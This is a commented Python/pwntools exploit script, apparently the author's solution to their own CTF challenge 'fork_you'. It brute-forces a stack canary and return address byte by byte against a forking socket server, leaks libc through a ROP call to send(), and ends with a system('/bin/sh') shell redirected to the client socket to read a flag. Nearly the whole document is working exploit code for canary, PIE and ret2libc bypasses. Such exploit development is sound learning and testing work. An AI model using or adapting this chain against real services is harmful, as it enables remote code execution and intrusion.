#solve fork_you

#it's my own challenge so hey


#it's a simple ret2libc
#except it has a canary (and PIE) with no leak

#but it's a forking socket server - each new forked child has an identical PIE base and canary

#additionally, because a canary fail will occur inside the handle_client function,
#and there's a send ("Get out") after that function
#we can brute force the canary byte-by-byte

#if we send enough to overflow the least significant byte of the canary only
#if we get that byte wrong, it will exit with a stack smashing detected - and never send "Get out"
#but if we get it right, we will receive "Get out"

#we can perform the same attack on the return address
#so
from pwn import *

binary = ELF("fork_you")
libc = ELF("fork_you_remote_libc.so") #obtained below
#the stack frame is 0x90 in size - the last 8 bytes of it are the canary
"""
│           0x0000132d      55             push rbp
│           0x0000132e      4889e5         mov rbp, rsp
│           0x00001331      4881ec900000.  sub rsp, 0x90
"""

"""
│      ╎│   0x00001565      e8bffdffff     call sym.handle_client
│      ╎│   0x0000156a      8b05a42a0000   mov eax, dword [obj.client_fd] ; [0x4014:4]=0
"""
#the return address will be 0x0000156a from handle_client

#so

canary = b""
#I know the LSB of this is a nullbyte - it always is
#but I won't specifically write it here, so I have a quick sanity check as to whether the canary is right

#current value (timesaver if you have to run this multiple times):
#canary = p64(0x50d74a8f0383300)

overflowstring = b"A"*(0x90-8)

context.log_level = "error"

while len(canary) < 8:
    
    for i in range(256):
        #print(i)
        new_byte = bytes([i])
        doit = remote("10.10.1.204",42011)
        doit.recvuntil("name?: ")
        
        #note specifically send and not sendline -
        #a trailing newline would mean the canary is always wrong
        doit.send(overflowstring + canary + new_byte)
        
        try:
            doit.recvuntil("Get out\n")
            #no exception, right byte
            print("new canary byte found: " + hex(i))
            canary += new_byte
            break
        except EOFError:
            pass #wrong - ended early
        finally:
            #print("closed")
            doit.close()
    else:
        print("No bytes worked - skill issue")
        exit(1)

print("canary: " + hex(u64(canary)))


#we do the same again for the return address (and so the PIE base)
#changing it will almost certainly break the program - 
#we also know the LSB of this (since it's page aligned, always ends with the same 3 nibbles - in this case, 56a)
#since the smallest changes are by changing the LSB, this time I'll start with that already selected

return_address = b"\x6a"

#again, timesaver
#return_address = p64(0x5594cebd956a)

while len(return_address) < 8:
    
    for i in range(256):
        #print(i)
        new_byte = bytes([i])
        doit = remote("10.10.1.204",42011)
        doit.recvuntil("name?: ")
        
        #note specifically send and not sendline -
        #a trailing newline would mean the canary is always wrong
        
        #also, here
        #we set the previous frame pointer to 0 - doesn't matter if it's wrong,
        #we still get the "get out" if the return address is right
        doit.send(overflowstring + canary + p64(0) + return_address + new_byte)
        
        try:
            doit.recvuntil("Get out\n")
            #no exception, right byte
            print("new return address byte found: " + hex(i))
            return_address += new_byte
            break
        except EOFError:
            pass #wrong - ended early
        finally:
            #print("closed")
            doit.close()
    else:
        print("No bytes worked - skill issue")
        exit(1)

print("return address: " + hex(u64(return_address)))

pie_base = u64(return_address) - 0x0000156a

print("pie base: " + hex(pie_base))

#since we're working with sockets,
#we can't just use puts or printf out of the box - they write to stdout

#since the child process is always an exact copy, the file descriptor for the client connection is always the same - 
#in this case, it's 4

#so we'll use the dup2 function - luckily, it's already been used in the program (how generous of me) so it's in the PLT
#this allows us to duplicate stdout to the file descriptor 4
#and it's very simple - it only takes 2 integers, no complicated FILE structs
#we'll need to do this again later for stdin if we want to use system

#we want dup2(4,1), so

"""
0x0000000000001633 : pop rdi ; ret
0x0000000000001631 : pop rsi ; pop r15 ; ret
"""

doit = remote("10.10.1.204",42011)
doit.recvuntil("name?: ")

pop_rdi = p64(pie_base + 0x1633)
pop_rsi_r15 = p64(pie_base + 0x1631)

'''
leak_payload = overflowstring + canary + p64(0) + \
               pop_rdi + p64(4) + pop_rsi_r15 + p64(1) + p64(0) + p64(pie_base + binary.plt["dup2"]) + \
               pop_rdi + p64(pie_base + binary.got["puts"]) + p64(pie_base + binary.plt["puts"]) + \
               p64(pie_base + binary.sym["handle_client"])
'''

'''
dup2_payload = overflowstring + canary + p64(0) + \
               pop_rdi + p64(4) + pop_rsi_r15 + p64(1) + p64(0) + p64(pie_base + binary.plt["dup2"]) + \
               p64(pie_base + binary.sym["handle_client"])

doit.send(dup2_payload)
doit.recvuntil("name?: ")

leak_payload = overflowstring + canary + p64(0) + \
               pop_rdi + p64(pie_base + binary.got["puts"]) + p64(pie_base + binary.plt["puts"]) + \
               p64(pie_base + binary.sym["handle_client"])
'''

#these work locally, but not remotely (specifically, not remotely when hosted on docker rather than a VM - weird?)
#alright then
#hmm

#I could use write, but

#       ssize_t write(int fd, const void *buf, size_t count);
#I can't control count - I don't know what's in rdx
#and I have no pop rdx
#it's also not used in the binary - send is
#which also has a flags argument that I don't really want to mess with

#lets try it blind anyway, though
#ssize_t send(int sockfd, const void *buf, size_t len, int flags)
#the last function called is send -
#so the len and flags should still be set from the previous send

leak_payload = overflowstring + canary + p64(0) + \
               pop_rdi + p64(4) + pop_rsi_r15 + p64(pie_base + binary.got["puts"]) + p64(0) + p64(pie_base + binary.plt["send"]) + \
               p64(pie_base + binary.sym["handle_client"])



#leak real address of puts
#we jump back to handle client and not main - don't want more children :moyai:
assert len(leak_payload) < 0x128

doit.send(leak_payload)

r = doit.recvuntil("name?: ")
#print(r.split(b"\n"))

"""
[b'\x00Actually I changed my mind, fork is awesome lmao get owned', b"\x00\xa0%\xf8\x9e,\x7f\x00\x00\xa0\xe8\x01\x9f,\x7f\x00\x00\x00\xdb\x02\x9f,\x7f\x00\x00`\xdb\x02\x9f,\x7f\x00\x000\xca\x00\x9f,\x7f\x00\x00p\xe6\x01\x9f,\x7f\x00\x00P\xdb\x02\x9f,\x7f\x00\x00p\xc9\x00\x9fWelcome to forks anonymous, what's your name?: "]
"""
#it works - how miraculous
#so
leak = u64(r.split(b"\n")[1][1:9]) #extra nullbyte appears at the start from before


print("real puts address: " + hex(leak))

#0x7f2c9ef825a0 = puts
#0x7f2c9f00ca30 = dup2
#0x7f2c9f01e670 = send

#using libc.rip

"""
libc6_2.31-0ubuntu9.2_amd64
libc6_2.31-0ubuntu9.1_amd64
libc6_2.31-0ubuntu9.3_amd64
"""

#it's at fork_you_remote_libc.so

#so now, we can do

libc_base = leak - libc.sym["puts"]
print("libc_base: " + hex(libc_base))

system = libc_base + libc.sym["system"]
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))

#we dup2 stdin to 4 as well

shell_payload = overflowstring + canary + p64(0) + \
                pop_rdi + p64(4) + pop_rsi_r15 + p64(0) + p64(0) + p64(pie_base + binary.plt["dup2"]) + \
                pop_rdi + p64(binsh) + p64(system)
                
doit.send(shell_payload)

#doit.interactive()

#hm, I think it worked
#but I don't know if we can see stdout - or if my stdin is actually reaching it

#I could redirect it to file descriptor 4 on the command line
#yeah, it does work

#so we do
#ls >&4

#and we receive the output
#nice - so it looks like in docker, dup2(4,1) doesn't work - 
#I don't know why, but it is possible to bypass and pretty fun to do as well

doit.sendline("cat flag.txt >&4")
doit.interactive()



